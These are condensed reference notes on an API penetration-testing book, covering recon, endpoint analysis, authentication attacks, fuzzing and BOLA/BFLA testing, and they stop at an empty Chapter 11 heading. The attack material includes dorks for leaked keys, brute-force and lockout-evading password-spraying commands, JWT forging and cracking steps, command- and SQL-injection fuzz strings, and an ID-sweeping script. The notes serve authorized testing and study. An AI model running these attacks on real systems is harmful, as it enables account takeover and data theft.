# Hacking APIs — Reference Notes (Chapters 6–14)
*Corey J. Ball, "Hacking APIs" (No Starch Press, 2022) — condensed technical reference: commands, tools, and methodology in sequence.*

---

## Chapter 6: Discovery

### 📌 Must-Know Key Points
- APIs are rarely linked in the UI — you **must** actively dig for them (JS files, DevTools Network tab, Burp history) since they're invisible to normal browsing.
- **Passive before active**: passive recon (OSINT) builds your target list without alerting the target; active recon (scanning) validates and expands it — do them in that order.
- The single most common real-world API discovery vector is **JavaScript source files** — API routes, keys, and internal endpoint names leak there constantly.
- `robots.txt` almost always reveals paths the org wants hidden — check it on every engagement, it's free.
- A single Nmap scan is never enough — always follow a quick detection scan with an **all-ports scan** (`-p-`); APIs frequently run on nonstandard ports.
- GitHub (Code/Issues/Pull Requests tabs) is one of the highest-yield places to find live or recently-fixed API key leaks.
- Treat every open port with an HTTP response as a potential API — don't assume only port 80/443 matter.

### Goal
Locate APIs, credentials/secrets, version info, documentation, and business purpose — via **passive** then **active** reconnaissance.

### Passive Recon Process
1. **Phase 1 — Cast a wide net**: general search engines (Google, Shodan, ProgrammableWeb), DNS mapping.
2. **Phase 2 — Adapt and focus**: narrow searches, GitHub search, Pastehunter.
3. **Phase 3 — Document attack surface**: take notes/screenshots, build a task list.

### Google Hacking (Dorking)
Query operators:
```
intitle:   -- search page titles
inurl:     -- search words in URL
filetype:  -- search file types
site:      -- limit to specific site
```
Examples:
```
inurl:/api/
intitle:"<targetname> api key"
inurl:"/wpjson/wp/v2/users"
intitle:"index.of" intext:"api.txt"
inurl:"/includes/api/" intext:"index of /"
ext:php inurl:"api.php?action="
intitle:"index of" api_key OR "api key" OR apiKey -pool
```
GHDB (Google Hacking Database): https://www.exploit-db.com/google-hacking-database

### ProgrammableWeb
API directory: https://www.programmableweb.com — search for target's API by name, review Versions/Changelog/Libraries tabs.
Other repos: https://rapidapi.com, https://apis.guru/browse-apis

### Shodan
Search engine for internet-facing devices: https://shodan.io
```
hostname:"targetname.com"
"content-type: application/json"
"content-type: application/xml"
"200 OK"
"wp-json"
```
Example:
```
"ewise.com" "content-type: application/json"
```

### OWASP Amass (passive + active recon)
```bash
sudo apt-get install amass

# Config setup
mkdir $HOME/.config/amass
curl https://raw.githubusercontent.com/OWASP/Amass/master/examples/config.ini > $HOME/.config/amass/config.ini
# edit config.ini to add API keys (GitHub, Twitter, Censys, etc.)

# Passive subdomain enum
amass enum -passive -d twitter.com | grep api

# Intel: collect SSL certs / reverse whois / ASN IDs
amass intel -addr <target IP addresses>
amass intel -d <target domain> --whois

# Enumerate subdomains
amass enum -passive -d <target domain>
amass enum -active -d <target domain>

# Brute force subdomains
amass enum -active -brute -w /usr/share/wordlists/API_superlist -d <target domain> -dir <directory name>

# Visualize results (HTML)
amass viz -enum -d3 -dir <directory name>
```

### GitHub Recon
- Search org name + "api-key", "password", "token"
- Review **Code** tab (search for "API", "key", "secret"; check commit **History** → **Split** view)
- Review **Issues** tab (open issues may reveal live vulns/exposed keys)
- Review **Pull Requests** tab (in-progress fixes may still expose secrets in diff)

### Active Recon Process (phased, non-linear)
- **Phase 0** — Opportunistic exploitation (exploit as soon as found)
- **Phase 1** — Detection scanning (Nmap)
- **Phase 2** — Hands-on analysis (browser + Burp Suite, DevTools)
- **Phase 3** — Targeted scanning (Gobuster, Kiterunner, ZAP, Burp)

### Nmap Baseline Scanning
```bash
# General detection scan (saves to 3 formats)
nmap -sC -sV <target> -oA nameofoutput

# All-port scan
nmap -p- <target> -oA allportscan
```

### robots.txt
Check `https://target.com/robots.txt` for disallowed/hidden API paths.

### Chrome DevTools (finding sensitive info)
1. Open target page, `F12` or `CTRL-SHIFT-I`.
2. **Network** tab → refresh → inspect JS files → right-click → **Open in Sources Panel**.
3. Search source for: `API`, `APIkey`, `secret`, `password`.
4. **Memory** tab → Heap Snapshot → search snapshot for `api`, `v1`, `v2`, `swagger`, `rest`, `dev`.
5. **Performance** tab → record → click around → inspect network calls triggered by actions (e.g., login).

### Validating with Burp Suite
- Intercept request → **Forward** → send to **Repeater**.
- Compare response for real resource (`/user/1`) vs nonexistent (`/user/test098765`) to establish baseline (401 vs 404).
- Check `WWW-Authenticate` header for path disclosure (e.g., `/api/auth`).

### OWASP ZAP — Crawling
```
Quick Start tab → enter target URL → Attack
```
- Review **Spider** / **Sites** tabs for discovered endpoints.
- Use **Search** tab for terms: "API", "GraphQL", "JSON", "RPC", "XML".
- **Manual Explore** → ZAP HUD → browse manually while ZAP scans in background.

### Gobuster — Brute-force URIs
```bash
gobuster dir -u http://192.168.195.132:8000 -w /home/hapihacker/api/wordlists/common_apis_160

# ignore/include status codes
gobuster dir -u http://targetaddress/ -w /usr/share/wordlists/api_list/common_apis_160 -x 200,202,301 -b 302

gobuster dir -h   # help
```

### Kiterunner — API-aware content discovery
```bash
# install
git clone https://github.com/assetnote/kiterunner.git
cd kiterunner
make build
sudo ln -s $(pwd)/dist/kr /usr/local/bin/kr

# wordlists
mkdir -p ~/api/wordlists
curl https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2021_06_28.txt > latest_api_wordlist.txt
wget -r --no-parent -R "index.html*" https://wordlists-cdn.assetnote.io/data/ -nH

# scan
kr scan http://192.168.195.132:8090 -w ~/api/wordlists/data/kiterunner/routes-large.kite

# scan with auth header
kr scan http://192.168.50.35:8090 -w ~/api/wordlists/data/kiterunner/routes-large.kite -H 'x-access-token: <TOKEN>'

# brute with text wordlist
kr brute <target> -w ~/api/wordlists/data/automated/nameofwordlist.txt

# replay a discovered request
kr kb replay "GET 414 [ 183, 7, 8] http://192.168.50.35:8888/api/privatisations/count <hash>" -w ~/api/wordlists/data/kiterunner/routes-large.kite

# replay proxied through Burp
kr kb replay -w ~/api/wordlists/data/kiterunner/routes-large.kite --proxy=http://127.0.0.1:8080 "GET 403 [...] http://..."
```

### Lab 3 workflow (crAPI black box)
```bash
netdiscover                              # find target IP on network
nmap -sC -sV 192.168.50.35 -oA crapi_scan
nmap -p- 192.168.50.35                   # all ports
```
Then: visit each open HTTP port in browser → DevTools → Network → search JS source for "API" → intercept Signup POST with Burp+FoxyProxy "Hackz" proxy → confirm `/identity/api/auth/signup`.

### 🎯 Bug Bounty Add-ons for Discovery

```bash
# assetfinder — quick subdomain discovery (pairs well with subfinder for coverage overlap)
go install github.com/tomnomnom/assetfinder@latest
assetfinder --subs-only target.com

# crt.sh — certificate transparency recon (finds forgotten api./dev./staging. subdomains)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# github-subdomains / github-search / trufflehog / gitleaks — org-wide secret & subdomain leaks
go install github.com/gwen001/github-subdomains@latest
github-subdomains -d target.com -t $GITHUB_TOKEN

pip install trufflehog3 --break-system-packages
trufflehog3 --rules default https://github.com/targetorg/targetrepo

gitleaks detect --source . -v                      # scan a cloned repo for API keys/tokens
gitleaks detect --source . --report-path leaks.json

# JS secret & endpoint mining (huge for bug bounty — API routes are almost always in bundled JS)
pip install LinkFinder --break-system-packages
python3 linkfinder.py -i https://target.com/static/js/main.js -o cli

git clone https://github.com/m4ll0k/SecretFinder
python3 SecretFinder.py -i https://target.com -e          # crawl + regex for keys/tokens in JS

# SecLists + hakrawler/katana combo for fast JS harvesting at scale
go install github.com/hakluke/hakrawler@latest
echo https://target.com | hakrawler -subs -u | grep '\.js$' | sort -u > js_files.txt
for f in $(cat js_files.txt); do python3 SecretFinder.py -i "$f" -o cli; done

# x8 / ParamSpider — hidden parameter & historical parameterized URL discovery (great for mass assignment leads)
go install github.com/Sh1Yo/x8@latest
x8 -u https://target.com/api/v1/user -X POST --body-type json -w params.txt

pip install paramspider --break-system-packages
paramspider -d target.com

# Shodan / Censys CLI — quickly map exposed API infra (good for recon-heavy bounty programs)
pip install shodan --break-system-packages
shodan init $SHODAN_API_KEY
shodan search "ssl:target.com http.title:swagger"
shodan search "http.title:'API Gateway' hostname:target.com"

# Swagger/OpenAPI doc hunting dorks & direct probes (classic quick-win bounty find)
curl -s https://target.com/swagger.json -o /dev/null -w "%{http_code}\n"
curl -s https://target.com/v2/api-docs -o /dev/null -w "%{http_code}\n"
curl -s https://target.com/openapi.json -o /dev/null -w "%{http_code}\n"
ffuf -u https://target.com/FUZZ -w swagger-wordlist.txt -mc 200
# google dork: site:target.com inurl:swagger OR inurl:openapi.json OR inurl:v2/api-docs
```

---

## Chapter 0 / 4 / 5 tooling setup (referenced throughout)

### 📌 Must-Know Key Points
- **Authorization is mandatory** before any real engagement — get a signed SOW; without it, everything else in this document is illegal to run against a target you don't own or have explicit permission to test.
- Threat model first: pick **black box / gray box / white box** based on the realistic threat actor — don't default to the hardest option if it doesn't match the engagement's purpose.
- Build your proxy chain correctly once and reuse it forever: **Browser → FoxyProxy → Burp Suite ⇄ Postman** — this single setup underlies nearly every technique in the book.
- Always install the Burp CA certificate in your browser, or HTTPS interception silently fails and you waste hours debugging "nothing shows up in Burp."
- Keep a disposable, isolated lab (Docker containers for Pixi/Juice Shop/DVGA/crAPI) — **never** expose vulnerable lab apps to your real network.
- Rate-limit and DoS restrictions are usually off by default in scope — confirm explicitly before firing high-volume fuzzing/brute-force attacks.

### Kali base setup
```bash
sudo apt update
sudo apt full-upgrade -y
sudo apt-get install git python3 golang
```

### Chrome install
```bash
sudo wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install ./google-chrome-stable_current_amd64.deb
google-chrome
```

### Burp Suite CE
```bash
sudo apt-get install burpsuite
```
**FoxyProxy setup**: add proxy 127.0.0.1:8080, name it "Hackz".
**CA Certificate**: with Hackz proxy on, browse `http://burpsuite` → download CA cert → import into browser cert manager (Authorities).

### Postman install
```bash
sudo wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz
sudo tar -xvzf postman-linux-x64.tar.gz -C /opt
sudo ln -s /opt/Postman/Postman /usr/bin/postman
postman
```
FoxyProxy second entry: 127.0.0.1:5555, name "Postman". Postman Settings → Proxy → custom proxy 127.0.0.1:8080, SSL verification Off (to chain to Burp).

### Supplemental tools install
```bash
# Nikto — included in Kali
nikto -h https://example.com
nikto -h http://target -output filename -maxtime #ofseconds

# OWASP ZAP — included in Kali (or clone https://github.com/zaproxy/zaproxy)

# Wfuzz — included in Kali (or https://github.com/xmendez/wfuzz)

# Arjun
cd /opt/
sudo git clone https://github.com/s0med3v/Arjun.git
python3 /opt/Arjun/arjun.py -u http://target_address.com
python3 /opt/Arjun/arjun.py -u http://target_address.com -o arjun_results.json
python3 /opt/Arjun/arjun.py -u http://target_address.com -o arjun_results.json --stable
python3 /opt/Arjun/arjun.py -i burp_targets.txt
```

### Docker + Docker Compose (for vuln lab)
```bash
# follow https://docs.docker.com/engine/install/ubuntu
sudo docker run hello-world     # verify
# Docker Compose: https://docs.docker.com/compose/install
```

### Vulnerable targets
```bash
# Pixi
git clone https://github.com/DevSlop/Pixi.git
cd Pixi
sudo docker-compose up
# browse http://localhost:8000

# OWASP Juice Shop
docker pull bkimminich/juice-shop
docker run --rm -p 80:3000 bkimminich/juice-shop
# browse http://localhost

# Damn Vulnerable GraphQL App (DVGA)
sudo docker pull dolevf/dvga
sudo docker run -t -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
# browse http://localhost:5000

# crAPI — see OWASP crAPI GitHub docker-compose instructions
```

### 🎯 Bug Bounty Add-ons for Lab/Tooling

```bash
# Caido — modern Burp alternative many bounty hunters now run alongside Burp for HTTP/2 heavy targets
# (install from caido.io releases; workflow: Intercept -> Replay -> HTTP History -> Automate)

# dirsearch — fast, actively maintained alternative/companion to Gobuster/ffuf
pip install dirsearch --break-system-packages
dirsearch -u https://target.com -e json,js,txt -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# feroxbuster — Rust-based recursive content discovery, very fast on large API surfaces
cargo install feroxbuster   # or: apt install feroxbuster
feroxbuster -u https://target.com/api/ -w ~/api/wordlists/common_apis_160 -x json -t 50
```

---

## Chapter 7: Endpoint Analysis

### 📌 Must-Know Key Points
- **Never trust API documentation as complete or accurate** — always test for undocumented methods, endpoints, and parameters beyond what the docs describe ("distrust and verify").
- Finding a real specification file (OpenAPI/Swagger/RAML) is a massive time-saver — it imports directly into Postman and basically hands you a pre-built attack collection.
- Always **use the API as intended first** before attacking it — this builds the "normal" baseline you need to later spot anomalies (wrong status codes, odd response sizes, verbose errors).
- Test privileged/admin actions as an **unauthenticated → low-priv → admin** user in that exact order to see exactly where (if anywhere) access control actually kicks in.
- Response analysis is where most "quick win" vulnerabilities surface: watch headers (`X-Powered-By`), status codes, and response size for info disclosure, excessive data exposure, and misconfig clues.
- Business logic flaws are *never* found by automated scanners — they require you to think adversarially about what the API is trusting you not to do, then doing exactly that.

### Finding Documentation
Common doc paths:
```
https://example.com/docs
https://example.com/api/docs
https://docs.example.com
https://dev.example.com/docs
https://developer.example.com/docs
https://api.example.com/docs
https://example.com/developers/documentation
```
If not found: directory brute force with subdomain/dir wordlists, check Wayback Machine (https://web.archive.org/), social engineering (with authorization).

Documentation notation conventions:
```
:id or {id}      -- path variable
[optional]       -- optional param
"a" || "b"       -- possible values
<DOMString>      -- 16-bit string type
```

### Importing API Specifications into Postman
`Import → Link → paste specification URL → Continue → Import`
Supported: OpenAPI 3.0, RAML 0.8/1.0, GraphQL, cURL, WADL, Swagger 1.2/2.0, Runscope, DHC.
Edit collection variables via: `Collection options (•••) → Edit → Variables`.

### Reverse Engineering APIs with Postman
**Manual**: `My Workspace → New → Collection` → set `baseURL` variable → `Add Request` per discovered call.

**By proxy capture**:
1. Postman: top-right signal icon → **Capture requests and cookies** → set port (5555) → select target collection → **Capture Requests: On**.
2. Browser: set FoxyProxy to Postman proxy, use the app end-to-end (register, auth, reset pw, browse, upload, etc.).
3. Clean up captured requests into folders.

### Authentication setup example (Pixi)
```
POST {{baseUrl}}/api/register
Body (x-www-form-urlencoded): user=<email>, pass=<password>
```
Save returned token as a collection/environment variable (e.g. `{{hapi_token}}`), add as header:
```
x-access-token: {{hapi_token}}
```
Feed token into Kiterunner:
```bash
kr scan http://192.168.50.35:8090 -w ~/api/wordlists/data/kiterunner/routes-large.kite -H 'x-access-token: <JWT>'
```

### Analyzing Functionality — Checklist
- What actions can I take?
- Can I interact with other user accounts?
- What resources are available?
- How are new resources identified?
- Can I upload/edit a file?

Test privileged (admin) actions as: unauthenticated → low-priv → admin (in that order) to confirm access control enforcement.

### Finding Vulnerabilities at this stage
- **Information disclosure**: verbose headers (`X-Powered-By`), unique status codes mapping to valid/invalid resources, doc leakage of business logic.
- **Security misconfigurations**: verbose errors, poor TLS (sniff with Wireshark), debug pages left enabled (e.g., Django debug).
- **Excessive data exposure**: request small object, receive large/nested object with unrelated user data.
- **Business logic flaws**: look for doc language like "only use X for Y", "do not do X with endpoint Y" → do the opposite; test file upload size/type limits.

### 🎯 Bug Bounty Add-ons for Endpoint Analysis

```bash
# unfurl — slice up discovered URLs into paths/params/keys for fast triage at scale
go install github.com/tomnomnom/unfurl@latest
cat api_candidates.txt | unfurl keys | sort -u          # list every unique query-param name seen
cat api_candidates.txt | unfurl paths | sort -u          # list every unique endpoint path seen

# httpx to batch-probe every discovered endpoint for live status + response size/title in one pass
cat api_candidates.txt | httpx -silent -status-code -content-length -title -tech-detect -o live_api_endpoints.txt

# Automatically pull & diff OpenAPI specs over time (great for catching newly-added admin endpoints)
curl -s https://target.com/v3/api-docs -o spec_$(date +%F).json
diff spec_2026-01-01.json spec_2026-02-01.json

# apicheck — OpenAPI-spec-driven linting + quick sanity/security checks
pip install apicheck --break-system-packages
apicheck openapi-security-checker -f spec.json

# swagger-ui-exposure + api-doc-finder style dork/ffuf combo for program-wide doc sweeps
ffuf -u https://FUZZ.target.com/swagger-ui.html -w subdomains.txt -mc 200
```

---

## Chapter 8: Attacking Authentication

### 📌 Must-Know Key Points
- REST is stateless — once authenticated, the API typically issues a **token** that must be sent with every subsequent request; attacking that token is often more valuable than attacking the login form itself.
- **Password spraying beats brute-forcing** against any API with a lockout policy — a few likely passwords across many usernames avoids triggering account lockout thresholds.
- Always check if auth payloads are **base64-encoded** before fuzzing — encode your payloads to match, or the API will reject them before even reaching the comparison logic.
- JWTs are **not encrypted by default** — base64 is not security. Always decode and inspect the header/payload for the algorithm and claims before attacking.
- The three classic JWT attacks, in order of likelihood of success: **`alg: none`** → **algorithm confusion (RS256→HS256)** → **offline secret cracking**. Always try them in that order (cheapest/fastest first).
- A weak/guessable JWT secret (tested offline with a wordlist) means you can forge **any** user's token, including admins — this is one of the highest-impact findings possible in API testing.
- Token "randomness" is testable — use Burp Sequencer's entropy analysis; low entropy means predictable characters you can brute-force instead of guessing blind.

### Password Brute-Force (Wfuzz)
```bash
wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' --hc 405 \
  -H 'Content-Type: application/json' \
  -z file,/home/hapihacker/rockyou.txt \
  http://192.168.195.130:8888/api/v2/auth
```
Flags: `-d` body payload, `--hc` hide status code, `-H` header, `-z file,<path>` wordlist.

### Password Reset / MFA Brute Force (Burp Intruder)
1. Capture password-reset/OTP request.
2. Set attack position around OTP value.
3. Payloads tab → type **Brute forcer** → set charset (e.g. `0123456789`), min/max length = 4.

### Password Spraying (Burp Intruder — cluster bomb)
- Payload 1: usernames list
- Payload 2: small curated password list (POS — path-of-least-resistance passwords):
```
Winter2021!
Spring2021!
QWER!@#$
Password1!
March212006!
July152006!
Twitter@2022
JPD1976!
Dorsey@2021
```
Attack type: **cluster bomb**. Sort results by status code/length for anomalies.

### Base64-Encoded Auth in Attacks
- Burp Decoder: highlight payload → right click → **Base64-decode** (`CTRL-SHIFT-B`).
- Intruder → Payloads → **Add** → **Encoded** → **Base64-encode** (payload processing rule).

### Forging Tokens — Burp Sequencer
**Manual load analysis**: `Sequencer → Manual Load → Load (tokens file) → Analyze Now` → review Summary + Character-Level Analysis (Character Position).

**Live capture**: intercept token-generation request → send to Sequencer → **Token Location Within Response** → **Configure** custom location → highlight token → **Start Live Capture** (up to 20,000 tokens).

### Brute-Forcing Predictable Tokens
Burp Intruder: set attack positions on variable chars, type **cluster bomb**, charset per position (e.g. letters `a-d` and digits `0-9`).

Wfuzz equivalent:
```bash
wfuzz -u vulnexample.com/api/v2/user/dashboard --hc 404 \
  -H "token: Ab4dt0k3nFUZZFUZ2ZFUZ3Z1" \
  -z list,a-b-c-d -z list,a-b-c-d -z range,0-9
```

### JSON Web Tokens (JWT)
Format: `header.payload.signature` (each base64, period-separated).

**Decode**: Burp Decoder → paste JWT → **Decode As → Base64**. Or https://jwt.io.

**JWT_Tool**:
```bash
jwt_tool <JWT_Token>                                  # decode/analyze
jwt_tool -t http://target-site.com/ -rc "Header: JWT_Token" -M pb   # playbook scan
```

**None attack**: set `"alg": "none"`, edit payload, base64-encode header/payload, strip signature (remove everything after final `.`).

**Algorithm switch attack**:
```bash
jwt_tool <JWT_Token> -X a                             # generate "none" variants
jwt_tool <JWT_Token> -X k -pk public-key.pem           # RS256 -> HS256 key confusion
```

**Crack attack (offline, dictionary)**:
```bash
jwt_tool <JWT_Token> -C -d /wordlist.txt
jwt_tool <JWT_Token> -C -d rockyou.txt
jwt_tool <JWT_Token> -C -d crapi.txt
```

### Lab 5 — crAPI JWT crack example
```bash
jwt_tool <token> -C -d rockyou.txt      # fails (14M tested, not found)
jwt_tool <token> -C -d crapi.txt        # custom targeted wordlist -> "crapi" found
# then forge token for other users via jwt.io using secret "crapi" + algo HS512
```

### 🎯 Bug Bounty Add-ons for Authentication

```bash
# Hydra — classic fast network/HTTP-form brute forcer (useful when rate limiting genuinely isn't present)
hydra -l admin -P rockyou.txt target.com https-post-form "/api/v1/login:user=^USER^&pass=^PASS^:F=invalid"

# credmaster — serverless/Lambda-backed distributed password spraying (evades per-IP lockouts, bounty-scale)
git clone https://github.com/knavesec/CredMaster
python3 credmaster.py -a okta -u users.txt -p passwords.txt --aws_access_key $AK --aws_secret_key $SK

# Snallygaster — scans for exposed sensitive files (often reveals leaked .env / API credentials)
pip install snallygaster --break-system-packages
snallygaster target.com

# trufflehog — scan LIVE endpoints/responses (not just git) for accidentally embedded API keys
trufflehog http https://target.com --json

# testssl.sh — quick TLS/cert misconfig check (weak ciphers can indicate broader neglect/old API infra)
git clone --depth 1 https://github.com/drwetter/testssl.sh
./testssl.sh/testssl.sh https://target.com

# Session/Token entropy quick-check without Burp (useful for CLI-only workflows)
python3 - << 'EOF'
import collections, math
tokens = open("captured_tokens.txt").read().splitlines()
for pos in range(len(tokens[0])):
    chars = [t[pos] for t in tokens if len(t) > pos]
    counts = collections.Counter(chars)
    probs = [c/len(chars) for c in counts.values()]
    entropy = -sum(p*math.log2(p) for p in probs)
    print(f"pos {pos}: entropy={entropy:.2f} bits, unique={len(counts)}")
EOF
```

---

## Chapter 9: Fuzzing

### 📌 Must-Know Key Points
- Fuzzing success depends entirely on **where** you fuzz and **what** you fuzz with — random payloads against random fields rarely find anything; think about what each field *expects* and send the opposite.
- Always establish a **baseline** of normal responses (status code + length + behavior) before fuzzing — without it, you can't recognize an anomaly even when you're staring right at it.
- **Fuzz wide, then fuzz deep**: sweep one payload across every endpoint first (Postman Collection Runner) to find *where* a weakness exists, then drill into that one request with many payloads (Burp Intruder/Wfuzz/ffuf).
- Burp's **Comparer** (with Sync Views) is the fastest way to catch subtle one-byte/one-field differences between two large responses — don't eyeball large JSON by hand.
- Improper assets management (old/test/`v1` API versions) is found by fuzzing the **path/version segment specifically** — it's a distinct, high-value fuzzing target separate from parameter fuzzing.
- Watch your request volume — Burp Community Edition's Intruder is intentionally throttled; switch to Wfuzz/ffuf when you need speed or large payload sets.

### Effective fuzzing principles
- Target fields likely to cause errors: auth forms, registration, uploads, profile/account edits, user mgmt, search.
- Generic payload set (null bytes, symbols, huge numbers, large strings, unicode):
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
9999999999999999999999999999999999999999
~'!@#$%^&*()-_+
{}[]|\:'';'<>?,./
%00
0x00
$ne
%24ne
$gt
%24gt
|whoami
-- -
' ''
' OR 1=1-- -
'' ''''''
```
Sources: SecLists (big-list-of-naughty-strings.txt), fuzzdb, Wfuzz injections/All_attack.txt.

### Detecting anomalies
Build a **baseline** of normal responses (status code + length), then flag deviations. Use Burp **Comparer** (`Send to Comparer`) + **Sync Views** for byte-level diff.

### Fuzzing Wide — Postman
1. Build environment with fuzzing variables (`fuzz1`, `fuzz2`, etc.).
2. Replace header/body values with `{{fuzz1}}` across the collection.
3. Use **Find and Replace** to batch-substitute placeholder tags.
4. Add collection-level test:
```js
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});
```
5. Run via **Collection Runner** (toggle "Keep Variable Values", "Save Responses").

### Fuzzing Deep — Burp Intruder
- Set attack positions on every header/param/body field.
- Attack type **sniper** for single-payload-set sweeps across many positions.
- Inspect results → group by status code/length → open **Response** tab for verbose errors.

### Fuzzing Deep — Wfuzz (full command anatomy)
```bash
wfuzz -z file,/home/hapihacker/big-list-of-naughty-strings.txt \
  -H "Content-Type: application/json" \
  -H "x-access-token: [...]" \
  -p 127.0.0.1:8080:HTTP \
  --hc 400 \
  -X PUT \
  -d "{\"user\": \"FUZZ\", \"pass\": \"FUZZ\", \"id\": \"FUZZ\", \"name\": \"FUZZ\", \"is_admin\": \"FUZZ\", \"account_balance\": \"FUZZ\"}" \
  -u http://192.168.195.132:8090/api/user/edit_info
```
Flags: `-z` payload source, `-H` header, `-p` proxy, `--hc` hide code, `-X` method, `-d` body, `-u` URL.

### Fuzzing Wide for Improper Assets Management
- Set a `path` collection variable (e.g. `v2`), baseline-scan with an intentionally bad value (e.g. `fail12345`) expecting 404 for all.
- Collection test:
```js
pm.test("Status code is 404", function () {
    pm.response.to.have.status(404);
});
```
- Sweep candidate paths: `v1`, `v2`, `v3`, `test`, `mobile`, `uat`, `dev`, `internal`.
- Anything that *doesn't* fail the "404 expected" test = improper assets management candidate.

### Testing HTTP Methods (Wfuzz)
```bash
wfuzz -z list,GET-HEAD-POST-PUT-PATCH-TRACE-OPTIONS-CONNECT -X FUZZ http://testsite.com/api/v2/account
```

### Bypassing Input Sanitization ("fuzz deeper")
Add escape char + second fuzz payload:
```
"user": "a@b.com%00§test§"
"user": "a@b.com§escape§§test§"
```
Use **cluster bomb** with escape-char payload set × attack-payload set.

### Directory Traversal payloads
```
..
..\
../
\..\
\..\.\
```

### 🎯 Bug Bounty Add-ons for Fuzzing

```bash
# x8 — best-in-class hidden parameter discovery (huge win on bounty targets with undocumented filters)
x8 -u https://target.com/api/v1/search -w params.txt --output params_found.json -X GET

# Param Miner (Burp extension) — install via BApp Store; auto-guesses hidden headers/params that
# change behavior (cache poisoning, hidden feature flags, debug params like ?debug=true, ?admin=1)

# kr (Kiterunner) wide-and-deep combined sweep against a whole subdomain list
cat live_hosts.txt | while read host; do
  kr scan "$host" -w ~/api/wordlists/data/kiterunner/routes-large.kite -x 50 -j > "kr_$(echo $host | tr '/:' '_').json"
done

# Response-diffing at scale with ffuf (great anomaly-hunting technique for bounty triage)
ffuf -u https://target.com/api/v1/FUZZ -w wordlist.txt -ac -o anomalies.json
#   -ac = auto-calibrate filtering (ffuf learns the "normal" response and flags true outliers)

# dalfox — fast dedicated XSS scanner, pipes well from URL lists harvested above
go install github.com/hahwul/dalfox/v2@latest
cat api_candidates.txt | dalfox pipe --silence

# kxss / Gxss — fast reflected-parameter discovery to feed into XSS/injection fuzzing
go install github.com/Emoe/kxss@latest
cat api_candidates.txt | kxss
```

---

## Chapter 10: Exploiting Authorization (BOLA / BFLA)

### 📌 Must-Know Key Points
- **BOLA is consistently the #1 most common and most severe API vulnerability** (OWASP API Security Top 10 #1, both 2019 and 2023 editions) — it should be the first thing you test for on every single API.
- The core distinction: **BOLA = unauthorized access to data** (can I *see* someone else's resource?); **BFLA = unauthorized access to actions** (can I *do* something to someone else's resource, like delete/edit?). Test both separately.
- A predictable/sequential resource ID is **not** itself a vulnerability — the API is only vulnerable if it fails to verify the requester actually owns/can access that ID. Don't report predictability alone as the finding.
- Resource identifiers aren't only in the URL path — check the **request body, query strings, and headers** too (nested objects, email-as-ID, group+user combos).
- **A-B testing** (two accounts, swap tokens, request each other's data) is the fastest, most reliable manual method to confirm BOLA — always register a second test account early in any engagement.
- Be careful with BFLA testing involving `DELETE` — test on a small scale / your own test resources first, since a successful fuzzing sweep could destroy real client data at scale.
- Side-channel disclosures (status code or timing differences between existing vs. nonexistent resources) can confirm BOLA-adjacent info leaks even when the data itself isn't directly returned.

### Locating Resource IDs — patterns to test
| Type | Example |
|---|---|
| Predictable ID | `/api/v1/account/2222` → `/api/v1/account/3333` |
| ID combo | `/api/v1/UserA/data/2222` → `/api/v1/UserB/data/3333` |
| Integer as ID | body `{"Account": 2222}` → `{"Account":[3333]}` |
| Email as user ID | `{"email":"UserA@email.com"}` → `UserB@email.com` |
| Group ID | `/api/v1/group/CompanyA` → `CompanyB` |
| Nested object | `{"Account": {"Account":3333}}` |
| Multiple objects | repeat key with multiple values |
| Predictable token | guess adjacent token string |

### A-B Testing for BOLA
1. Create resources as UserA — note identifiers/requests.
2. Register/obtain UserB token.
3. Request UserA's resources using UserB's token.
4. Focus on PII: name, email, phone, SSN, bank info, transactions.

### Side-Channel BOLA
Compare response **status codes / lengths / timing** for existing vs nonexistent resources to enumerate valid IDs even without data leakage (e.g. 404 vs 405 reveals existence).

### A-B-A Testing for BFLA
1. CRUD resources as UserA.
2. Swap to UserB token; attempt GET/PUT/POST/DELETE on UserA's resources.
3. Re-check with UserA's token/account to confirm the change stuck.
4. Repeat across privilege levels (basic → admin) for privilege escalation testing.

### BFLA testing in Postman
Example: send `DELETE /api/picture/2` with **UserB**'s token against **UserA**'s resource → confirm deletion via follow-up GET.

### Authorization Hacking Tips
- **Postman**: swap collection auth-token variable (UserA → UserB), run Collection Runner against private-data requests, flag 200s.
- **Burp Match and Replace**: Settings → Match and Replace rule to auto-swap the Authorization header value across all proxied requests (UserA → UserB), replay.

### Lab 7 — crAPI vehicle GUID BOLA
```http
GET /identity/api/v2/vehicle/<GUID>/location HTTP/1.1
Authorization: Bearer <OTHER_USER_TOKEN>
```
Chain with earlier excessive-data-exposure leak (`vehicleid` field from `/community/api/v2/community/posts/recent`) to enumerate arbitrary users' vehicle GPS locations.

### 🎯 Bug Bounty Add-ons for Authorization (BOLA/BFLA)

```bash
# Autorize (Burp extension) — THE go-to bounty tool for BOLA/BFLA: configure a low-priv cookie/token,
# browse the app normally as admin/userA, and Autorize auto-replays every request with the low-priv
# token in the background, flagging anything that still succeeds ("Bypassed!" in red).
# BApp Store -> Autorize -> set "Intercept requests" on, set low-priv Authorization header, browse as victim.

# AuthMatrix (Burp extension) — matrix-based access control testing across multiple roles/users at once;
# define users x roles x endpoints, run all combinations, review the results grid for violations.

# Scripted ID-space sweep across ALL discovered IDOR-prone endpoints (not just one) — bulk bounty triage
python3 - << 'EOF'
import httpx, itertools

endpoints = ["/api/v1/user/{id}", "/api/v1/order/{id}", "/api/v1/invoice/{id}", "/api/v1/message/{id}"]
base = "https://target.com"
token = "Bearer LOW_PRIV_TOKEN"

for ep, i in itertools.product(endpoints, range(1, 500)):
    url = base + ep.format(id=i)
    r = httpx.get(url, headers={"Authorization": token}, timeout=10)
    if r.status_code == 200:
        print(f"[+] {url} -> {r.status_code} ({len(r.text)}b)")
EOF

# UUID/GUID brute shortcuts — many APIs leak sequential/time-based UUIDv1; check with uuid-tool
python3 -c "import uuid; print(uuid.uuid1())"   # if IDs look like this, timestamp+MAC may be guessable

# Burp Bounty (BApp) — custom passive/active scan profiles tuned for BOLA/BFLA signatures (response diffing rules)
```

---

## Chapter 11: Mass Assignment

### 📌 Must-Know Key Points
